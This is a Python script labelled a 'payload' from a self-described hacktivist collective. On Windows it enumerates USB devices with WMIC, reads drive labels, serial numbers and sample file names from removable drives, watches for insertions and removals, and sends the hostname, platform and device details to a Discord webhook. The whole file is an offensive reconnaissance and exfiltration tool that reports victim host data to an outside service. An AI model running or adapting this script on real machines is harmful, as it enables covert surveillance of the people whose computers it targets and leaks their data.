#!/usr/bin/env python3
"""
USB Device Monitor Payload
Monitors USB device insertions and removals (Windows)
⚡ EchoDead - Hacktivist Collective
"""

import os
import sys
import platform
import subprocess
import time
from datetime import datetime

# Add parent directory to path
sys.path.insert(0, os.path.dirname(__file__))
try:
    from webhook_utils import send_to_discord
    WEBHOOK_AVAILABLE = True
except ImportError:
    WEBHOOK_AVAILABLE = False

def get_usb_devices():
    """Get list of currently connected USB devices"""
    devices = []
    
    if platform.system() != "Windows":
        return devices
    
    try:
        # Use WMIC to query USB devices
        result = subprocess.run(
            'wmic path Win32_USBControllerDevice get Dependent',
            shell=True,
            capture_output=True,
            text=True,
            timeout=10
        )
        
        if result.returncode == 0:
            for line in result.stdout.splitlines():
                if 'USB' in line:
                    devices.append(line.strip())
    except:
        pass
    
    return devices

def get_usb_storage_devices():
    """Get USB storage devices (drives)"""
    storage = []
    
    if platform.system() != "Windows":
        return storage
    
    try:
        # List removable drives
        result = subprocess.run(
            'wmic logicaldisk where "DriveType=2" get DeviceID,VolumeName,Size,FreeSpace',
            shell=True,
            capture_output=True,
            text=True,
            timeout=10
        )
        
        if result.returncode == 0:
            lines = result.stdout.strip().splitlines()
            
            if len(lines) > 1:  # Header + data
                # Parse header
                header = lines[0].split()
                
                # Parse each device
                for line in lines[1:]:
                    if line.strip():
                        parts = line.split()
                        
                        if len(parts) >= 1:
                            device = {
                                'drive': parts[0] if len(parts) > 0 else '',
                                'label': parts[1] if len(parts) > 1 and not parts[1].isdigit() else 'No Label',
                                'size': parts[-2] if len(parts) >= 3 else '0',
                                'free': parts[-1] if len(parts) >= 2 else '0',
                            }
                            storage.append(device)
    except:
        pass
    
    return storage

def get_disk_info(drive_letter):
    """Get detailed information about a disk"""
    info = {}
    
    if platform.system() != "Windows":
        return info
    
    try:
        # Get disk details
        result = subprocess.run(
            f'wmic logicaldisk where "DeviceID=\'{drive_letter}\'" get FileSystem,Size,FreeSpace,VolumeName,VolumeSerialNumber',
            shell=True,
            capture_output=True,
            text=True,
            timeout=5
        )
        
        if result.returncode == 0:
            lines = result.stdout.strip().splitlines()
            if len(lines) > 1:
                header = lines[0].split()
                values = lines[1].split()
                
                for i, key in enumerate(header):
                    if i < len(values):
                        info[key] = values[i]
    except:
        pass
    
    return info

def list_files_on_drive(drive_letter, max_files=50):
    """List files on a USB drive"""
    files = []
    
    try:
        for root, dirs, filenames in os.walk(f"{drive_letter}\\"):
            for filename in filenames:
                full_path = os.path.join(root, filename)
                try:
                    size = os.path.getsize(full_path)
                    files.append({
                        'path': full_path,
                        'name': filename,
                        'size': size,
                    })
                except:
                    pass
                
                if len(files) >= max_files:
                    break
            
            if len(files) >= max_files:
                break
    except:
        pass
    
    return files

def monitor_usb_devices(duration_seconds=60):
    """Monitor for USB device changes"""
    print(f"🔍 Monitoring USB devices for {duration_seconds} seconds...")
    print("   Insert or remove USB devices to test detection\n")
    
    initial_devices = get_usb_storage_devices()
    initial_device_ids = set([d['drive'] for d in initial_devices])
    
    print(f"📊 Initial state: {len(initial_devices)} USB storage device(s) connected")
    for device in initial_devices:
        size_mb = int(device.get('size', 0)) // (1024 * 1024) if device.get('size', '0').isdigit() else 0
        print(f"   • {device['drive']} - {device['label']} ({size_mb:,} MB)")
    print()
    
    start_time = time.time()
    events = []
    
    try:
        while time.time() - start_time < duration_seconds:
            time.sleep(2)  # Check every 2 seconds
            
            current_devices = get_usb_storage_devices()
            current_device_ids = set([d['drive'] for d in current_devices])
            
            # Check for new devices
            new_devices = current_device_ids - initial_device_ids
            if new_devices:
                for drive in new_devices:
                    device_info = next((d for d in current_devices if d['drive'] == drive), None)
                    
                    if device_info:
                        size_mb = int(device_info.get('size', 0)) // (1024 * 1024) if device_info.get('size', '0').isdigit() else 0
                        
                        event = {
                            'type': 'inserted',
                            'drive': drive,
                            'label': device_info['label'],
                            'size_mb': size_mb,
                            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        }
                        events.append(event)
                        
                        print(f"✅ USB INSERTED: {drive} - {device_info['label']} ({size_mb:,} MB)")
                        
                        # Send notification
                        if WEBHOOK_AVAILABLE:
                            send_to_discord("🔌 USB Device Inserted", event)
            
            # Check for removed devices
            removed_devices = initial_device_ids - current_device_ids
            if removed_devices:
                for drive in removed_devices:
                    event = {
                        'type': 'removed',
                        'drive': drive,
                        'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    }
                    events.append(event)
                    
                    print(f"❌ USB REMOVED: {drive}")
                    
                    # Send notification
                    if WEBHOOK_AVAILABLE:
                        send_to_discord("🔌 USB Device Removed", event)
            
            # Update baseline
            initial_device_ids = current_device_ids
    
    except KeyboardInterrupt:
        print("\n⚠️  Monitoring interrupted by user")
    
    return events

def main():
    print("=" * 70)
    print("USB DEVICE MONITOR PAYLOAD")
    print("=" * 70)
    print(f"\nExecution Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"Platform: {platform.system()} {platform.release()}")
    print(f"Hostname: {platform.node()}\n")
    
    if platform.system() != "Windows":
        print("❌ This payload only works on Windows systems")
        print("   Current system: " + platform.system())
        
        if WEBHOOK_AVAILABLE:
            send_to_discord("⚠️  USB Monitor - Platform Error", {
                "Error": "USB monitoring requires Windows",
                "Platform": platform.system(),
            })
        return
    
    # Get current USB devices
    print("=" * 70)
    print("CURRENT USB DEVICES")
    print("=" * 70 + "\n")
    
    print("🔍 Scanning for USB devices...")
    all_usb = get_usb_devices()
    storage_usb = get_usb_storage_devices()
    
    print(f"\n📊 USB Device Summary:")
    print(f"   Total USB devices: {len(all_usb)}")
    print(f"   USB storage devices: {len(storage_usb)}\n")
    
    if storage_usb:
        print("💾 USB Storage Devices:\n")
        
        for device in storage_usb:
            drive = device['drive']
            label = device['label']
            size = int(device.get('size', 0)) if device.get('size', '0').isdigit() else 0
            free = int(device.get('free', 0)) if device.get('free', '0').isdigit() else 0
            
            size_mb = size // (1024 * 1024)
            free_mb = free // (1024 * 1024)
            used_mb = size_mb - free_mb
            
            print(f"  📁 {drive} - {label}")
            print(f"     Total: {size_mb:,} MB")
            print(f"     Used: {used_mb:,} MB")
            print(f"     Free: {free_mb:,} MB")
            
            # Get detailed info
            disk_info = get_disk_info(drive)
            if disk_info:
                fs = disk_info.get('FileSystem', 'Unknown')
                serial = disk_info.get('VolumeSerialNumber', 'Unknown')
                print(f"     File System: {fs}")
                print(f"     Serial Number: {serial}")
            
            # List some files
            print(f"\n     📄 Files (sample):")
            files = list_files_on_drive(drive, max_files=10)
            
            if files:
                for file in files[:10]:
                    file_size_kb = file['size'] // 1024
                    print(f"       • {file['name']} ({file_size_kb:,} KB)")
            else:
                print("       (No files found or access denied)")
            
            print()
    else:
        print("ℹ️  No USB storage devices currently connected\n")
    
    # Ask user if they want to monitor
    print("=" * 70)
    print("USB MONITORING")
    print("=" * 70 + "\n")
    
    print("Options:")
    print("  1. Monitor for 60 seconds")
    print("  2. Monitor for 5 minutes")
    print("  3. Skip monitoring (snapshot only)")
    print()
    
    try:
        choice = input("Select option (1-3): ").strip()
        
        if choice == '1':
            events = monitor_usb_devices(duration_seconds=60)
        elif choice == '2':
            events = monitor_usb_devices(duration_seconds=300)
        else:
            print("⏭️  Skipping monitoring")
            events = []
    except:
        print("\n⏭️  Skipping monitoring (no input)")
        events = []
    
    # Summary
    print("\n" + "=" * 70)
    print("SUMMARY")
    print("=" * 70)
    
    summary = {
        "Platform": f"{platform.system()} {platform.release()}",
        "Hostname": platform.node(),
        "Total USB Devices": len(all_usb),
        "USB Storage Devices": len(storage_usb),
        "Events Detected": len(events),
        "Timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    }
    
    if storage_usb:
        drive_list = [f"{d['drive']} ({d['label']})" for d in storage_usb]
        summary["Connected Drives"] = ", ".join(drive_list)
    
    if events:
        insertions = len([e for e in events if e['type'] == 'inserted'])
        removals = len([e for e in events if e['type'] == 'removed'])
        summary["Insertions"] = insertions
        summary["Removals"] = removals
    
    for key, value in summary.items():
        print(f"{key}: {value}")
    
    # Send to Discord
    if WEBHOOK_AVAILABLE:
        print("\n📤 Sending report to Discord...")
        if send_to_discord("💾 USB Monitor Report", summary):
            print("✅ Report sent successfully!")
            
            # Send device details
            if storage_usb:
                device_details = {}
                for device in storage_usb:
                    size_mb = int(device.get('size', 0)) // (1024 * 1024) if device.get('size', '0').isdigit() else 0
                    device_details[f"{device['drive']} - {device['label']}"] = f"{size_mb:,} MB"
                
                send_to_discord("💾 USB Device Details", device_details)
        else:
            print("⚠️  Discord webhook not configured")
    else:
        print("\n⚠️  Webhook module not available")
    
    print("\n✅ USB monitoring complete!")

if __name__ == "__main__":
    main()
